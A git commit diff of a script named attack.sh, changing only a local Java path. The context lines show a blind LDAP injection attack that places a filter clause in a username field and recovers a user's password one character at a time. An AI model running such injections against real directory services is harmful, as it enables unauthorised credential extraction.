b8e64a7f71c1df23007b1433cdd01316f378bfd1
Raj Chowdhury <30806882+Rajchowdhury420@users.noreply.github.com>
2023-07-05 03:05:33 +0530

    Upgraded to Mac

--- attack.sh
+++ attack.sh
@@ -11,7 +11,7 @@ do
     found=0
     while read -n1 character; do
         username="bob)(userPassword=${password}${character}*"
-        /home/artem/jdk/jdk1.9.0b160/bin/java -cp classes LDAPInfo ${username} > log 2>&1
+        /Users/Raj/jdk/jdk1.9.0b160/bin/java -cp classes LDAPInfo ${username} > log 2>&1
         if grep telephoneNumber log > /dev/null 2>&1 ; then
             # found next letter
             password="${password}${character}"
